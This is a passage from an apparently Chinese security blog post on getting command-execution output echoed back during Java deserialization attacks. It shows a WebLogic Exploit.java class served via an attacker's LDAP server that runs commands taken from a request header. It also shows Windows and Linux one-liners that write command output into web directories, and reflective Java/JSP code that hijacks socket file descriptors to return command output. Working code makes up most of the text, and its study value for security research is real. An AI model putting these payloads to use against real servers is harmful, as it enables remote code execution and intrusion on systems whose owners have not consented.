class="keyword">byte</span>[] buffer = baos.toByteArray();</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221135505051.png" alt="image-20201221135505051"></p>
<h3 id="WebLogic回显"><a href="#WebLogic回显" class="headerlink" title="WebLogic回显"></a>WebLogic回显</h3><p>​        根据lufei在<code>weblogic_2019_2725poc与回显构造</code>中的分析，可以通过获取当前请求线程中的header和response对象，在header中获取请求参数，在response中通过<code>response.getOutputStream().write(&quot;xxxx&quot;);</code> 来获取命令执行的结果,代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(<span class="string">"lfcmd"</span>);</span><br><span class="line">weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();</span><br><span class="line">weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();</span><br><span class="line">outputStream.writeStream(<span class="keyword">new</span> weblogic.xml.util.StringInputStream(lfcmd));</span><br><span class="line">outputStream.flush();</span><br><span class="line">response.getWriter().write(<span class="string">""</span>);</span><br></pre></td></tr></table></figure>

<p>​        这种获取回显的方法也可以配合到LDAP和RMI等协议获取回显的方式中，首先我们编写一个Exploit.java内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String lfcmd = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(<span class="string">"lfcmd"</span>);</span><br><span class="line">        String[] cmds = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, lfcmd&#125;;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">        java.util.Scanner s = <span class="keyword">new</span> java.util.Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">        String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">        weblogic.servlet.internal.ServletResponseImpl response = ((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getResponse();</span><br><span class="line">        weblogic.servlet.internal.ServletOutputStreamImpl outputStream = response.getServletOutputStream();</span><br><span class="line">        outputStream.writeStream(<span class="keyword">new</span> weblogic.xml.util.StringInputStream(output));</span><br><span class="line">        outputStream.flush();</span><br><span class="line">        response.getWriter().write(<span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​     在自己的VPS上开启LDAP服务，执行结果如下</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221152936908.png" alt="image-20201221152936908"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221152826165.png" alt="image-20201221152826165"></p>
<h3 id="Windows回显"><a href="#Windows回显" class="headerlink" title="Windows回显"></a>Windows回显</h3><h4 id="执行结果写入web目录"><a href="#执行结果写入web目录" class="headerlink" title="执行结果写入web目录"></a>执行结果写入web目录</h4><p>​        当我们在一些web网站测试过程中遇到了没有回显的命令执行漏洞，可以通过将命令执行结果写入到web目录下的文件的方式获取回显，首先要解决一个问题是怎么才能找到当前网站的目录呢？可以通过<code>dir /s /b e:\web.xml</code>这种方式获取e盘下所有的web.xml的目录。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221162728556.png" alt="image-20201221162728556"></p>
<p>​        其次我们可以将我们命令执行的结果循环写入到找到的这些文件的目录中，利用代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd &#x2F;c &quot;for &#x2F;f %i in (&#39;dir &#x2F;s &#x2F;b e:tomcat.css&#39;) do (echo %i&gt; %i.path.txt) &amp; (ipconfig &gt; %i.cmd.txt)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221162905061.png" alt="image-20201221162905061"></p>
<p>​        如果是通过GET方式进行利用，需要将请求的内容编码，否则会下入不成功。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221163149040.png" alt="image-20201221163149040"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221163227146.png" alt="image-20201221163227146"></p>
<p>​        由于使用这种方式写入回显会向匹配到的结果循环写入文件，所以我们在选择要匹配的文件名的时候，尽量选择一些不容易和其他项目重复的文件名。</p>
<h4 id="socket文件描述符回显"><a href="#socket文件描述符回显" class="headerlink" title="socket文件描述符回显"></a>socket文件描述符回显</h4><p>​        对服务端发起请求时会对应一个socket的文件描述符，我们可以获得当前请求的文件描述符，并在相应中写入回显内容。使用这种方法我们需要明白两个问题</p>
<ul>
<li><p>如何在java中获取当前的socket文件描述符？</p>
<p>目前没有比较好的方法可以获取到当前请求的文件描述符,一般是通过暴力枚举文件操作符，再通过某些方式判断枚举的文件描述符是否有效，可以通过sun.nio.ch.Net#remoteAddress验证文件操作符是否有效，最后通过一些条件比如请求IP来过滤文件操作符是否来自于本次请求。</p>
</li>
<li><p>如何向socket文件描述符写入数据？</p>
<p>可以通过FileOutputStream或其子类写入回显数据。</p>
<p>参考<code>https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Windows/code/WindowsEcho.jsp</code>测试类，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/test"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException, NoSuchMethodException, ClassNotFoundException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(java.io.File.separator.equals(<span class="string">"\\"</span>))&#123;</span><br><span class="line">            java.lang.reflect.Field field = java.io.FileDescriptor.class.getDeclaredField("fd");</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz1 = Class.forName(<span class="string">"sun.nio.ch.Net"</span>);</span><br><span class="line">            java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(<span class="string">"remoteAddress"</span>,<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            method1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz2 = Class.forName(<span class="string">"java.net.SocketOutputStream"</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">            java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">            constructor2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            Class clazz3 = Class.forName(<span class="string">"java.net.PlainSocketImpl"</span>);</span><br><span class="line">            java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            constructor3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Method write = clazz2.getDeclaredMethod(<span class="string">"write"</span>,<span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>&#125;)</span>;</span><br><span class="line">            write.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            java.net.InetSocketAddress remoteAddress = <span class="keyword">null</span>;</span><br><span class="line">            java.util.List list = <span class="keyword">new</span> java.util.ArrayList();</span><br><span class="line">            java.io.FileDescriptor fileDescriptor = <span class="keyword">new</span> java.io.FileDescriptor();</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++)&#123;</span><br><span class="line">                field.set((Object)fileDescriptor, (Object)(<span class="keyword">new</span> Integer(i)));</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    remoteAddress= (java.net.InetSocketAddress) method1.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;);</span><br><span class="line">                    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/127.0.0.1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">                    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/0:0:0:0:0:0:0:1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">                    list.add(<span class="keyword">new</span> Integer(i));</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = list.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    field.set((Object)fileDescriptor, list.get(i));</span><br><span class="line">                    Object socketOutputStream = constructor2.newInstance(<span class="keyword">new</span> Object[]&#123;constructor3.newInstance(<span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;)&#125;);</span><br><span class="line">                    String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/C"</span>, <span class="string">"whoami"</span>&#125;;</span><br><span class="line">                    String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next().trim();</span><br><span class="line">                    String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + (res.length()) + <span class="string">"\n\n"</span> + res + <span class="string">"\n\n"</span>;</span><br><span class="line">                    write.invoke(socketOutputStream, <span class="keyword">new</span> Object[]&#123;result.getBytes()&#125;);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    <span class="comment">//pass</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221183135520.png" alt="image-20201221183135520"></p>
<p>​    我将上面的代码分为几段来讲解,先看一下第一段的代码，代码的说明我会写到注释中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">java.lang.reflect.Field field =java.io.FileDescriptor.class.getDeclaredField("fd");  //通过反射获取FileDescriptor的fd属性，</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);  <span class="comment">//由于fd属性是private，因此需要设置访问权限才能正常使用</span></span><br><span class="line">Class clazz1 = Class.forName(<span class="string">"sun.nio.ch.Net"</span>); <span class="comment">//获取Net类的Class对象</span></span><br><span class="line">java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(<span class="string">"remoteAddress"</span>,<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//获取sun.nio.ch.Net#remoteAddress方法</span></span><br><span class="line">method1.setAccessible(<span class="keyword">true</span>); <span class="comment">//由于remoteAddress方法不是public所以需要设置访问权限才能调用</span></span><br><span class="line">java.net.InetSocketAddress remoteAddress = <span class="keyword">null</span>;</span><br><span class="line">java.util.List list = <span class="keyword">new</span> java.util.ArrayList(); <span class="comment">//创建一个list列表，用来存储可以满足需求的文件描述符ID</span></span><br><span class="line">java.io.FileDescriptor fileDescriptor = <span class="keyword">new</span> java.io.FileDescriptor(); <span class="comment">//创建fileDescriptor对象</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50000</span>; i++)&#123; <span class="comment">//循环遍历文件描述符ID</span></span><br><span class="line">          field.set((Object)fileDescriptor, (Object)(<span class="keyword">new</span> Integer(i)));<span class="comment">//设置fd属性的值为i</span></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">    remoteAddress= (java.net.InetSocketAddress) method1.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;); <span class="comment">//通过反射调用sun.nio.ch.Net#remoteAddress方法，并传入fileDescriptor对象。</span></span><br><span class="line">    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/127.0.0.1"</span>)) <span class="keyword">continue</span>; <span class="comment">//当通过remoteAddress获取的内容包含127.0.0.1是，也就是这个请求时127.0.0.1则排除</span></span><br><span class="line">    <span class="keyword">if</span>(remoteAddress.toString().startsWith(<span class="string">"/0:0:0:0:0:0:0:1"</span>)) <span class="keyword">continue</span>;</span><br><span class="line">      list.add(<span class="keyword">new</span> Integer(i)); <span class="comment">//满足条件则添加</span></span><br><span class="line">                &#125;<span class="keyword">catch</span>(Exception e)&#123;&#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>​        我们看一下remoteAddress是如何验证socket是否存在的？</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221193820631.png" alt="image-20201221193820631"></p>
<p>​    在remoteInetAddress方法中，会通过我们传入的FileDescriptor的值判断socket是否存在，当不存在是会抛出socket异常。</p>
</li>
</ul>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221193915547.png" alt="image-20201221193915547"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221194018415.png" alt="image-20201221194018415"></p>
<p>​        remoteInetAddress的实现在native层，也就是C来实现的，如果想要查看对应的C代码可以下载Openjdk来查看，remoteInetAddress的实现代码如下，在remoteInetAddress中会调用getpeername来获取socket的ip和端口号，获取失败则会pa</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222095043479.png" alt="image-20201222095043479"></p>
<p>​        如果remoteInetAddress方法可以正常获取，则返回InetSocketAddressHolder对象，在这个对象中包含hostname,addr,port等信息。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221194132910.png" alt="image-20201221194132910"></p>
<p>​        我们再看下第二段代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Class clazz2 = Class.forName(<span class="string">"java.net.SocketOutputStream"</span>, <span class="keyword">false</span>, <span class="keyword">null</span>);</span><br><span class="line">java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">constructor2.setAccessible(<span class="keyword">true</span>); <span class="comment">//通过反射调用获取SocketOutputStream的构造器</span></span><br><span class="line"></span><br><span class="line">Class clazz3 = Class.forName(<span class="string">"java.net.PlainSocketImpl"</span>);</span><br><span class="line">java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;java.io.FileDescriptor<span class="class">.<span class="keyword">class</span>&#125;)</span>; <span class="comment">//通过反射获取PlainSocketImpl的有参构造器。</span></span><br><span class="line">constructor3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">java.lang.reflect.Method write = clazz2.getDeclaredMethod(<span class="string">"write"</span>,<span class="keyword">new</span> Class[]&#123;<span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>&#125;)</span>;  <span class="comment">//调用java.net.SocketOutputStream#write方法，并传入byte[]数组</span></span><br><span class="line"> write.setAccessible(<span class="keyword">true</span>); <span class="comment">//更改write方法的访问权限</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = list.size() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)&#123; <span class="comment">//循环向所有满足条件的socket中写入命令执行的结果。</span></span><br><span class="line">     <span class="keyword">try</span>&#123;</span><br><span class="line">       field.set((Object)fileDescriptor, list.get(i)); <span class="comment">//设置fileDescriptor的fd属性</span></span><br><span class="line"> Object socketOutputStream = constructor2.newInstance(<span class="keyword">new</span> Object[]&#123;constructor3.newInstance(<span class="keyword">new</span> Object[]&#123;fileDescriptor&#125;)&#125;); <span class="comment">//通过反射创建socketOutputStream实例并传入PlainSocketImpl的实例。</span></span><br><span class="line">     String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"cmd"</span>,<span class="string">"/C"</span>, <span class="string">"whoami"</span>&#125;;  </span><br><span class="line">     String res = <span class="keyword">new</span> java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="string">"\\A"</span>).next().trim(); <span class="comment">//命令执行结果</span></span><br><span class="line">     String result = <span class="string">"HTTP/1.1 200 OK\nConnection: close\nContent-Length: "</span> + (res.length()) + <span class="string">"\n\n"</span> + res + <span class="string">"\n\n"</span>;  <span class="comment">//将命令执行的结果和响应头的部分拼接</span></span><br><span class="line">      write.invoke(socketOutputStream, <span class="keyword">new</span> Object[]&#123;result.getBytes()&#125;);</span><br><span class="line">                    <span class="keyword">break</span>; <span class="comment">//调用socketOutputStream的write方法写入命令执行结果。</span></span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    <span class="comment">//pass</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<p>​        socketOutputStream的构造参数需要传入AbstractPlainSocketImpl类型的参数。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200058463.png" alt="image-20201221200058463"></p>
<p>​        而PlainSocketImpl是AbstractPlainSocketImpl的子类，因此其返回的实例可以作为socketOutputStream的参数传入。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200144137.png" alt="image-20201221200144137"></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200243072.png" alt="image-20201221200243072"></p>
<p>​        为什么我们的写入socket数据的时候需要加入HTTP响应头？</p>
<p>​        我们抓包进行分析，可以看到我们写入的内容在真实的请求头之前，所以在我们写入数据时需要先添加一个请求头避免无法正常响应。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201221200405698.png" alt="image-20201221200405698"></p>
<h3 id="Linux回显"><a href="#Linux回显" class="headerlink" title="Linux回显"></a>Linux回显</h3><h4 id="执行结果写入web目录-1"><a href="#执行结果写入web目录-1" class="headerlink" title="执行结果写入web目录"></a>执行结果写入web目录</h4><p>​        这种实现方法和windows的方法类似，也是通过查找某些指定的文件名的位置，并将命令执行的结果写入到找到的文件目录中,运行如下命令，可以将命令执行的结果写入到web.xml同级目录下的test.txt中</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name web.xml|while read f;do sh -c 'id;pwd;ifconfig' &gt;$(dirname $f)/test.txt;done</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222102651892.png" alt="image-20201222102651892"></p>
<h4 id="socket文件描述符回显-1"><a href="#socket文件描述符回显-1" class="headerlink" title="socket文件描述符回显"></a>socket文件描述符回显</h4><p>​        在Linux中，可以通过命令来查看文件描述符从而获取到socket的连接信息,<code>cat /proc/net/tcp</code></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222110758528.png" alt="image-20201222110758528"></p>
<p>​        假如我们通过<code>nc -lvvp 8888</code>开启一个监听，我们如何找到对应的socket连接，首先<code>ps -elf|grep nc</code> 找到监听对应的进程ID。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145124269.png" alt="image-20201222145124269"></p>
<pre><code>根据进程ID找到对应的socket文件，socket后的数字代表INode</code></pre><p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145240659.png" alt="image-20201222145240659"></p>
<p>​        最后，我们就可以根据找到的Inode的信息找到对应的socket，<code>cat /proc/net/tcp|grep 2664048</code>并且可以获取源端口和地址还有目的端口和地址。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222145717578.png" alt="image-20201222145717578"></p>
<p>​        我们也可以根据请求的端口来找到对应的socket的Inode <code>cat /proc/net/tcp|awk &#39;{if($10&gt;0)print}&#39;|grep -i 125D|awk &#39;{print $10}&#39;</code></p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222151828714.png" alt="image-20201222151828714"></p>
<p>​        再根据Inode和进程id来获取fd也就是socket文件描述符的值<code>ls -l /proc/32591/fd|grep 2664048|awk &#39;{print $9}&#39;</code>。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222151905568.png" alt="image-20201222151905568"></p>
<p>​        我们分析一下<code>https://github.com/feihong-cs/Java-Rce-Echo/blob/master/Linux/code/case2.jsp</code>的实现,首先看一下执行结果，基本上可以稳定的获取到回显的结果。</p>
<p><img src="/2020/12/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9B%9E%E6%98%BE%E5%AD%A6%E4%B9%A0/image-20201222152243073.png" alt="image-20201222152243073"></p>
<p>​        代码实现如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="keyword">if</span>(java.io.File.separator.equals(<span class="string">"/"</span>))&#123;</span><br><span class="line">        String command  = <span class="string">"ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN&#123;FS=\"[\"&#125;''&#123;print $2&#125;'|sed 's/.$//'"</span>;  <span class="comment">//获取当前所有的Inode的值</span></span><br><span class="line">        String[] cmd = <span class="keyword">new</span> String[]&#123;<span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, command&#125;;</span><br><span class="line">        